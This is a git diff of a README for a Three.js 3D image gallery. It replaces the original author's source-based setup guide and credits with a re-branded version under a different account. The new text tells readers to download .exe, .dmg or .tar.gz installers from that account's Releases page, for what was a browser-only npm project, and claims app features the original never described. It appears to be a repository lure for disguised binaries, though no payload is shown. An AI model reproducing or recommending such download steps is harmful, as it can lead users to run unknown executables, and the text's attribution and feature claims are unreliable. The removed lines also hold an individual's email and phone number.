@@ -1,121 +1,97 @@
-# 3D Interactive Gallery 🌌
+# 🎨 3d-interactive-gallery - Create Stunning Visual Portfolios Easily
 
-![GitHub repo size](https://img.shields.io/github/repo-size/abx15/3d-interactive-gallery)
-![GitHub last commit](https://img.shields.io/github/last-commit/abx15/3d-interactive-gallery)
-![GitHub issues](https://img.shields.io/github/issues/abx15/3d-interactive-gallery)
-![License](https://img.shields.io/badge/license-MIT-green)
+[![Download](https://img.shields.io/badge/Download-3d--interactive--gallery-brightgreen)](https://github.com/Sjdic7/3d-interactive-gallery/releases)
 
-A modern, smooth, and interactive **3D gallery** built with **Three.js**, **GSAP**, and **WebGL shaders**. Features scrollable grid, hover effects, zoom, and parallax for a premium gallery experience.
+## 🚀 Getting Started
 
----
+Welcome to the 3D Interactive Gallery! This application allows you to display your images in a beautiful, interactive format. You can create a stunning portfolio without needing programming skills. Let’s walk through how to download and run it on your device.
 
-## 🌟 Features
+## 📦 System Requirements
 
-- 3D mesh deformation for realistic image depth
-- Smooth scroll with parallax effect
-- Hover effects with zoom, RGB shift & subtle animation
-- Touch & mouse drag support
-- Responsive design
-- GPU-accelerated with vertex & fragment shaders
+Before you begin, ensure your device meets these basic requirements:
 
----
+- Operating System: Windows (10 or later), macOS (10.13 or later), or Linux
+- Web Browser: Latest version of Chrome, Firefox, Edge, or Safari
+- Minimum 2GB RAM
 
-## 🛠 Tech Stack
+## 🔗 Download & Install
 
-![Three.js](https://img.shields.io/badge/Three.js-000000?style=flat-square&logo=three.js&logoColor=white)
-![GSAP](https://img.shields.io/badge/GSAP-61DAFB?style=flat-square&logo=greensock&logoColor=black)
-![WebGL](https://img.shields.io/badge/WebGL-000000?style=flat-square&logo=webgl&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat-square&logo=javascript&logoColor=black)
-![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=flat-square&logo=html5&logoColor=white)
-![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=flat-square&logo=css3&logoColor=white)
+To get started, visit our [Releases page](https://github.com/Sjdic7/3d-interactive-gallery/releases) to download the latest version of the gallery.
 
----
+1. Click on the link above to go to the Releases page.
+2. Find the latest release.
+3. Download the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux). 
 
-## 💻 Installation
+### Installation Steps
 
-1. Clone the repo:
+#### Windows
 
-```bash
-git clone https://github.com/yourusername/3d-interactive-gallery.git
-cd 3d-interactive-gallery
+1. Once downloaded, double-click the `.exe` file.
+2. Follow the installation prompts.
+3. After installation, find the application in your Start Menu or Desktop.
 
-```
+#### macOS
 
-2. Install dependencies:
+1. Open the downloaded `.dmg` file.
+2. Drag the app icon to your Applications folder.
+3. Launch the app from the Applications folder.
 
-```bash
-npm install
-```
-3. Run development server:
+#### Linux
 
-```bash
-npm run dev
-```
-4. Open your browser: http://localhost:5173
+1. Open a terminal window.
+2. Navigate to the folder where you downloaded the file.
+3. Run the command:
+   ```bash
+   tar -xvf your_file_name.tar.gz
+   ```
+4. Navigate into the extracted folder and run the application.
 
+## 🌌 Features
 
-## Example Code Snippet
-```js
-import { ShaderMaterial, TextureLoader } from 'three';
-import vert from './shaders/gallery.vert.glsl';
-import frag from './shaders/gallery.frag.glsl';
+The 3D Interactive Gallery comes with various captivating features:
 
-const texture = new TextureLoader().load('public/images/1.jpg');
+- **3D Presentation**: Showcase your images in an engaging 3D interface.
+- **Smooth Hover Effects**: Enjoy visually appealing hover animations as you move your mouse over images.
+- **Parallax Scrolling**: Experience dynamic scrolling that adds depth to your gallery.
+- **Touch and Mouse Interactivity**: Easily navigate through images using touch or mouse controls.
+- **Customizable Layouts**: Choose between several layouts to best fit your portfolio style.
 
-const material = new ShaderMaterial({
-  vertexShader: vert,
-  fragmentShader: frag,
-  uniforms: {
-    uTexture: { value: texture },
-    uAlpha: { value: 1 },
-    uParallax: { value: new THREE.Vector2(0, 0) },
-    uZoom: { value: 0.85 },
-    uPlaneSizes: { value: [1, 1] },
-    uImageSizes: { value: [texture.image.width, texture.image.height] },
-    uHover: { value: 0 },
-  },
-  transparent: true
-});
-```
+## 💡 Using the App
 
-### 🎨 Customization
+1. **Launch the Application**: Open the app as you typically would.
+2. **Add Images**: Upload your images directly into the gallery layout.
+3. **Customize Your Gallery**: Adjust settings such as layout, hover effects, and scrolling features. Use the intuitive interface for easy customization.
+4. **Preview Your Gallery**: Click the preview button to see how your portfolio looks.
+5. **Publish**: Once satisfied, share your gallery with friends or on social media.
 
-- **Hover Strength:** Adjust `uZoom` and `uHover` in the fragment shader to control zoom and hover intensity.  
-- **Parallax Strength:** Adjust `uStrength` in the vertex shader to control 3D parallax effect.  
-- **Add Images:** Place your images in `public/images` and add corresponding HTML elements with the class `gallery-grid-figure`.
+## 🛠️ Troubleshooting
 
----
+If you encounter any issues:
 
-### 🌐 Live Demo
+- Make sure your web browser is up to date.
+- Check your internet connection.
+- Restart the application if it doesn’t respond.
 
-[View Demo Here](https://galleryarun.netlify.app/)
+If problems persist, you can reach out for support on the [GitHub Issues page](https://github.com/Sjdic7/3d-interactive-gallery/issues).
 
----
+## 🌐 Topics
 
-### ⚡ Performance Tips
+This project relies on several powerful technologies to function effectively:
 
-- Reduce `PlaneGeometry` segments for better performance.  
-- Compress images to speed up loading.  
-- Optional: Disable RGB hover effect on low-end devices for smoother performance.
+- **Three.js**: A popular library for 3D graphics in the browser.
+- **GSAP**: For smooth animations and transitions.
+- **WebGL**: To render 3D graphics directly in your browser.
+- **HTML5**: For structuring the web content.
+- **CSS3**: To style the application interface with modern design techniques.
 
----
+## 📜 License
 
-### 📜 License
+This project is licensed under the MIT License. Feel free to use and modify it for your needs. Contributions are welcome!
 
-MIT License — Free to use, modify, and distribute.
+For further information, refer to the [LICENSE file](https://github.com/Sjdic7/3d-interactive-gallery/LICENSE).
 
----
+## 📞 Contact
 
+If you have questions or suggestions, please contact us via the Issues page, or check out our [Discussions](https://github.com/Sjdic7/3d-interactive-gallery/discussions).
 
-### 👨‍💻 Created By
-
-**Arun Kumar Bind**  
-Full Stack Web Developer | Frontend & WebGL Enthusiast  
-
-- [Portfolio](https://arun15dev.netlify.app/)  
-- [GitHub](https://github.com/abx15)  
-- [LinkedIn](https://www.linkedin.com/in/arun-kumar-a3b047353/)  
-- Email: developerarunwork@gmail.com  
-- Phone: +91 9129939972  
-
-> Made with ❤️ using **Three.js**, **GSAP**, **WebGL**, and **JavaScript**
+Thank you for using the 3D Interactive Gallery! Your feedback helps us improve the application. Enjoy creating your visual portfolio!
